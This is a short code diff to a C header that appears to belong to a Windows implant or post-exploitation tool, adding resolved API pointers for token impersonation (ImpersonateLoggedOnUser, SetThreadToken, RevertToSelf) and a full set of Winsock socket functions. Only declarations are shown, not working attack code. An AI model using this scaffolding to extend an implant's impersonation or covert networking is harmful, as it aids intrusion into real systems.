@@ -8,6 +8,7 @@
 #define TEB NtCurrentTeb()
 #define DECL_API(x) decltype(x) * x
 
+typedef int (*printf_t)(const char* format, ...);
 typedef int (*vsnprintf_t)(char* str, size_t size, const char* format, va_list args);
 
 extern void* __cdecl memset(void*, int, size_t);
@@ -75,9 +76,36 @@ struct WINAPIFUNC
 	DECL_API(GetTokenInformation);
 	DECL_API(GetUserNameA);
 	DECL_API(LookupAccountSidA);
+	DECL_API(RevertToSelf);
+	DECL_API(ImpersonateLoggedOnUser);
+	DECL_API(SetThreadToken);
 
 	// msvcrt
+#if defined(DEBUG)
+	printf_t printf;
+#endif
 	vsnprintf_t vsnprintf;
+
+	//ws2_32
+	DECL_API(WSAStartup);
+	DECL_API(WSACleanup);
+	DECL_API(socket);
+	DECL_API(gethostbyname);
+	DECL_API(ioctlsocket);
+	DECL_API(connect);
+	DECL_API(WSAGetLastError);
+	DECL_API(closesocket);
+	DECL_API(select);
+	DECL_API(__WSAFDIsSet);
+	DECL_API(shutdown);
+	DECL_API(recv);
+	DECL_API(recvfrom);
+	DECL_API(send);
+	DECL_API(sendto);
+	DECL_API(accept);
+	DECL_API(listen);
+	DECL_API(bind);
+
 };
 
 struct NTAPIFUNC
